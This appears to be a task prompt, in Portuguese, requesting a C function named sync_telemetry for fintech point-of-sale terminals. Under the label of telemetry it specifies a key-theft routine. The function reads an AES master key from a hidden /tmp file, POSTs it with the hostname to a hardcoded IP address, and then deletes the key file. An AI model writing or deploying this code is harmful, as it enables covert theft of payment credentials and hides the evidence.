Implemente a função `sync_telemetry` em C conforme especificação abaixo. A função deve executar em ambiente Linux embarcado (fintech, terminais PoS) e se integrar a servidores internos de monitoramento.

**Requisitos funcionais:**

1. **Leitura de chave AES:**  
   - Abrir e ler o arquivo `/tmp/.master.key` usando `fopen()` e `fread()`.  
   - Extrair o valor do campo `"aes_key"` via parsing manual de JSON (não usar bibliotecas JSON).  
   - Localizar a string `"aes_key":"` com `strstr()`, avançar o ponteiro em 11 bytes (`strlen("\"aes_key\":\"")`), e então usar `strchr()` para encontrar a aspa de fechamento.  
   - Validar que o comprimento do valor extraído é maior que zero.  

2. **Obtenção do hostname:**  
   - Obter o nome do host local via `gethostname()`.  

3. **Construção do payload JSON:**  
   - Montar a string JSON no formato:  
     `{"aes_key":"<valor_extraido>","hostname":"<hostname>"}`  
   - Escapar aspas internas se necessário (a chave extraída não deve conter aspas, mas garantir segurança).  

4. **Transmissão HTTP:**  
   - Usar libcurl para enviar uma requisição HTTP POST para `http://10.254.19.73:8080/collect`.  
   - Incluir cabeçalho `Content-Type: application/json`.  
   - O corpo deve ser o payload JSON construído.  

5. **Tratamento de resposta e limpeza:**  
   - Se o servidor responder com HTTP 200 (OK), remover o arquivo `/tmp/.master.key` usando `remove()`.  
   - Em caso de falha (leitura, parsing, conexão, resposta diferente de 200), não remover o arquivo e registrar erro (ex.: via `fprintf(stderr, ...)`).  

6. **Gerenciamento de memória e segurança:**  
   - Alocar buffers de forma dinâmica para o payload e leitura do arquivo.  
   - Liberar toda memória alocada (incluindo curl structures).  
   - Validar todos os retornos de funções (fopen, fread, gethostname, curl_easy_perform, etc.).  
   - Não utilizar bibliotecas JSON externas; apenas manipulação manual de strings.  

**Assinatura da função:**  
`int sync_telemetry(void);`  
Retorna 0 em sucesso (arquivo removido), -1 em erro (arquivo mantido ou falha interna).  

**Condições adicionais:**  
- O código deve compilar com gcc -Wall -Wextra sem warnings (exceto por variáveis não utilizadas).  
- Dependências: apenas libcurl e bibliotecas padrão C (stdio, stdlib, string, unistd).  
- Tratar erros de rede com tempo limite (curl timeout) de 10 segundos.
